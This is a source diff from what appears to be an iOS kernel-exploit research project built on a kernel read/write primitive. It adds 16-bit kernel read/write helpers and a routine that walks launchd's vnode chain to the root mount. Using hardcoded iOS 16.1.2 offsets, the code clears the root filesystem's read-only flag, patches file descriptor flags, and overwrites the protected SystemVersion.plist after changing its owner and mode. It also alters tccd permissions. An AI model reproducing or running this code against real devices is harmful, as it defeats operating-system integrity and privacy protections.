@@ -45,6 +45,11 @@ uint8_t kread8(u64 kfd, uint64_t where) {
     kread(kfd, where, &out, sizeof(uint8_t));
     return out;
 }
+uint32_t kread16(u64 kfd, uint64_t where) {
+    uint16_t out;
+    kread(kfd, where, &out, sizeof(uint16_t));
+    return out;
+}
 uint32_t kread32(u64 kfd, uint64_t where) {
     uint32_t out;
     kread(kfd, where, &out, sizeof(uint32_t));
@@ -68,6 +73,16 @@ void kwrite8(u64 kfd, uint64_t where, uint8_t what) {
     _buf[7] = kread8(kfd, where+7);
     kwrite((u64)(kfd), &_buf, where, sizeof(u64));
 }
+
+void kwrite16(u64 kfd, uint64_t where, uint16_t what) {
+    u16 _buf[4] = {};
+    _buf[0] = what;
+    _buf[1] = kread16(kfd, where+2);
+    _buf[2] = kread16(kfd, where+4);
+    _buf[3] = kread16(kfd, where+6);
+    kwrite((u64)(kfd), &_buf, where, sizeof(u64));
+}
+
 void kwrite32(u64 kfd, uint64_t where, uint32_t what) {
     u32 _buf[2] = {};
     _buf[0] = what;
@@ -683,6 +698,168 @@ uint64_t funVnodeResearch(u64 kfd, char* to, char* from) {
     return 0;
 }
 
+uint64_t findRootVnode(u64 kfd) {
+    uint32_t off_p_textvp = 0x350;
+    uint32_t off_vnode_v_name = 0xb8;
+    uint32_t off_vnode_v_parent = 0xc0;
+    
+    uint64_t launchd_proc = getProc(kfd, 1);
+    
+    uint64_t textvp_pac = kread64(kfd, launchd_proc + off_p_textvp);
+    uint64_t textvp = textvp_pac | 0xffffff8000000000;
+    printf("[i] launchd proc->textvp: 0x%llx\n", textvp);
+    
+    uint64_t textvp_nameptr = kread64(kfd, textvp + off_vnode_v_name);
+    uint64_t textvp_name = kread64(kfd, textvp_nameptr);
+    printf("[i] launchd proc->textvp->v_name: %s\n", &textvp_name);
+
+    uint64_t sbin_vnode = kread64(kfd, textvp + off_vnode_v_parent) | 0xffffff8000000000;
+    textvp_nameptr = kread64(kfd, sbin_vnode + off_vnode_v_name);
+    textvp_name = kread64(kfd, textvp_nameptr);
+    printf("[i] launchd proc->textvp->v_parent->v_name: %s\n", &textvp_name);
+    
+    uint64_t root_vnode = kread64(kfd, sbin_vnode + off_vnode_v_parent) | 0xffffff8000000000;
+    textvp_nameptr = kread64(kfd, root_vnode + off_vnode_v_name);
+    textvp_name = kread64(kfd, textvp_nameptr);
+    printf("[i] launchd proc->textvp->v_parent->v_parent->v_name: %s\n", &textvp_name);
+    
+    return root_vnode;
+}
+
+enum vtype    { VNON, VREG, VDIR, VBLK, VCHR, VLNK, VSOCK, VFIFO, VBAD, VSTR,
+              VCPLX };
+
+uint64_t funVnodeResearch2(u64 kfd, char* file) {
+    //16.1.2 offsets
+    uint32_t off_p_pfd = 0xf8;
+    uint32_t off_fd_ofiles = 0;
+    uint32_t off_fp_fglob = 0x10;
+    uint32_t off_fg_data = 0x38;
+    uint32_t off_vnode_iocount = 0x64;
+    uint32_t off_vnode_usecount = 0x60;
+    uint32_t off_vnode_vflags = 0x54;
+    uint32_t off_vnode_v_name = 0xb8;
+    uint32_t off_vnode_v_mount = 0xd8;
+    uint32_t off_vnode_v_data = 0xe0;
+    uint32_t off_vnode_v_kusecount = 0x5c;
+    uint32_t off_vnode_v_references = 0x5b;
+    uint32_t off_vnode_v_parent = 0xc0;
+    uint32_t off_vnode_v_label = 0xe8;
+    uint32_t off_vnode_v_cred = 0x98;
+    uint32_t off_vnode_vu_mountedhere = 0x68;
+    uint32_t off_vnode_vu_socket = 0x70;
+    uint32_t off_vnode_vu_specinfo = 0x78;
+    uint32_t off_vnode_vu_fifoinfo = 0x80;
+    uint32_t off_vnode_vu_ubcinfo = 0x88;
+    uint32_t off_vnode_v_writecount = 0xb0;
+    uint32_t off_vnode_v_type = 0x70;
+    uint32_t off_mount_mnt_data = 0x11F;
+    uint32_t off_mount_mnt_fsowner = 0x9c0;
+    uint32_t off_mount_mnt_fsgroup = 0x9c4;
+    uint32_t off_mount_mnt_devvp = 0x980;
+    uint32_t off_specinfo_si_flags = 0x10;
+    uint32_t off_fg_flag = 0x10;
+
+    int file_index = open(file, O_RDONLY);
+
+    if (file_index == -1) return -1;
+    
+    uint64_t proc = getProc(kfd, getpid());
+    
+    //get vnode
+    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
+    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
+    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
+    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
+    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
+    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
+    uint64_t to_vnode = vnode_pac | 0xffffff8000000000;
+    printf("[i] %s to_vnode: 0x%llx\n", file, to_vnode);
+    
+    uint16_t to_vnode_vtype = kread16(kfd, to_vnode + off_vnode_v_type);
+    printf("[i] %s to_vnode->vtype: 0x%x\n", file, to_vnode_vtype);
+    
+    uint64_t to_v_mount_pac = kread64(kfd, findRootVnode(kfd) + off_vnode_v_mount);
+    uint64_t to_v_mount = to_v_mount_pac | 0xffffff8000000000;
+    
+    uint32_t to_m_flag = kread32(kfd, to_v_mount + 0x70);
+    
+#define MNT_RDONLY      0x00000001      /* read only filesystem */
+    kwrite32(kfd, to_v_mount + 0x70, to_m_flag & ~MNT_RDONLY);
+    kwrite16(kfd, to_v_mount + off_vnode_v_type, VNON);
+    
+    
+    kwrite32(kfd, fileglob + off_fg_flag, O_ACCMODE);
+    
+    printf("[i] %s to_vnode->v_writecount: %d\n", file, kread32(kfd, to_vnode + off_vnode_v_writecount));
+    kwrite32(kfd, to_vnode + off_vnode_v_writecount, kread32(kfd, to_vnode + off_vnode_v_writecount)+1);
+    
+//    uint64_t to_v_mount_pac = kread64(kfd, to_vnode + off_vnode_v_mount);
+//    uint64_t to_v_mount = to_v_mount_pac | 0xffffff8000000000;
+//    printf("[i] %s to_vnode->v_mount: 0x%llx\n", file, to_v_mount);
+//    uint64_t to_devvp = kread64(kfd, to_v_mount + off_mount_mnt_devvp);
+//    printf("[i] %s to_vnode->v_mount->mnt_devvp: 0x%llx\n", file, to_devvp);
+//
+    
+    
+    
+    sleep(1);
+    const char* content = "AAAAAAAAAAAAAAAAAAAAAAA";
+    if(write(file_index, content, strlen(content)) == -1) {
+        perror("file write error");
+    }
+    
+    
+//    kwrite32(kfd, to_v_mount + 0x70, to_m_flag);
+    kwrite16(kfd, to_v_mount + off_vnode_v_type, to_vnode_vtype);
+    
+    close(file_index);
+
+    return 0;
+}
+
+
+uint64_t fun_ipc_entry_lookup(u64 kfd, mach_port_name_t port_name) {
+    uint64_t proc = getProc(kfd, getpid());
+    uint64_t proc_ro = kread64(kfd, proc + 0x18);
+    
+    uint64_t pr_proc = kread64(kfd, proc_ro + 0x0);
+    printf("[i] self proc->proc_ro->pr_proc: 0x%llx\n", pr_proc);
+    
+    uint64_t pr_task = kread64(kfd, proc_ro + 0x8);
+    printf("[i] self proc->proc_ro->pr_task: 0x%llx\n", pr_task);
+    
+    uint64_t itk_space_pac = kread64(kfd, pr_task + 0x300);
+    uint64_t itk_space = itk_space_pac | 0xffffff8000000000;
+    printf("[i] self task->itk_space: 0x%llx\n", itk_space);
+    //NEED TO FIGURE OUR SMR POINTER!!!
+    
+//    uint32_t table_size = kread32(kfd, itk_space + 0x14);
+//    printf("[i] self task->itk_space table_size: 0x%x\n", table_size);
+//    uint32_t port_index = MACH_PORT_INDEX(port_name);
+//    if (port_index >= table_size) {
+//        printf("[!] invalid port name: 0x%x", port_name);
+//        return -1;
+//    }
+//
+//    uint64_t is_table_pac = kread64(kfd, itk_space + 0x20);
+//    uint64_t is_table = is_table_pac | 0xffffff8000000000;
+//    printf("[i] self task->itk_space->is_table: 0x%llx\n", is_table);
+//    printf("[i] self task->itk_space->is_table read: 0x%llx\n", kread64(kfd, is_table));
+//
+//    const int sizeof_ipc_entry_t = 0x18;
+//    uint64_t ipc_entry = is_table + sizeof_ipc_entry_t * port_index;
+//    printf("[i] self task->itk_space->is_table->ipc_entry: 0x%llx\n", ipc_entry);
+//
+//    uint64_t ie_object = kread64(kfd, ipc_entry + 0x0);
+//    printf("[i] self task->itk_space->is_table->ipc_entry->ie_object: 0x%llx\n", ie_object);
+//
+//    sleep(1);
+    
+    
+    
+    return 0;
+}
 
 int do_fun(u64 kfd) {
     uint64_t kslide = ((struct kfd*)kfd)->perf.kernel_slide;
@@ -713,27 +890,40 @@ int do_fun(u64 kfd) {
     //Restore
     funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
     
+    mach_port_t host_self = mach_host_self();
+    printf("[i] mach_host_self: 0x%x\n", host_self);
+    fun_ipc_entry_lookup(kfd, host_self);
+    
+    NSString *path = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/abcd.txt"];
+    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
+    [@"Hello, this is an example file!" writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil];
+    
+    //NEW WAY, open with O_RDONLY AND PATCH TO O_RDWR
+    funVnodeChown(kfd, "/System/Library/CoreServices/SystemVersion.plist", 501, 501);
+    funVnodeChmod(kfd, "/System/Library/CoreServices/SystemVersion.plist", 0107777);
+    funVnodeResearch2(kfd, "/System/Library/CoreServices/SystemVersion.plist");
+    //Restore permission
+    funVnodeChown(kfd, "/System/Library/CoreServices/SystemVersion.plist", 0, 0);
+    funVnodeChmod(kfd, "/System/Library/CoreServices/SystemVersion.plist", 0100444);
+    
+
     
     //Redirect Folders: NSHomeDirectory() + @"/Documents/mounted" -> /var
-    NSString *mntPath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/mounted"];
-    [[NSFileManager defaultManager] removeItemAtPath:mntPath error:nil];
-    [[NSFileManager defaultManager] createDirectoryAtPath:mntPath withIntermediateDirectories:NO attributes:nil error:nil];
+//    NSString *mntPath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/mounted"];
+//    [[NSFileManager defaultManager] removeItemAtPath:mntPath error:nil];
+//    [[NSFileManager defaultManager] createDirectoryAtPath:mntPath withIntermediateDirectories:NO attributes:nil error:nil];
 //    funVnodeRedirectFolder(kfd, mntPath.UTF8String, "/");
-    NSArray* dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
+//    NSArray* dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
 //    NSLog(@"/var directory: %@", dirs);
     
     //TODO: Redirect /System/Library/PrivateFrameworks/TCC.framework/Support/ -> NSHomeDirectory(), @"/Documents/mounted"
     
     //Redirect Folders: NSHomeDirectory() + @"/Documents/mounted" -> /var/mobile
-    funVnodeResearch(kfd, mntPath.UTF8String, mntPath.UTF8String);
-    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
-    NSLog(@"[i] /var/mobile dirs: %@", dirs);
-    [@"여자친구 생기게 해주세요!@#" writeToFile:[mntPath stringByAppendingString:@"/kfd.txt"] atomically:YES encoding:NSUTF8StringEncoding error:nil];
-    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
-    NSLog(@"[i] Created /var/mobile/kfd.txt,  dirs: %@", dirs);
-    [[NSFileManager defaultManager] removeItemAtPath:[mntPath stringByAppendingString:@"/kfd.txt"]  error:nil];
-    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
-    NSLog(@"[i] Removed /var/mobile/kfd.txt, dirs: %@", dirs);
+//    funVnodeResearch(kfd, mntPath.UTF8String, mntPath.UTF8String);
+//    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
+//    NSLog(@"[i] /var/mobile dirs: %@", dirs);
+    
+    
     
     
 //    funVnodeOverwriteFile(kfd, mntPath.UTF8String, "/var/mobile/Library/Caches/com.apple.keyboards");
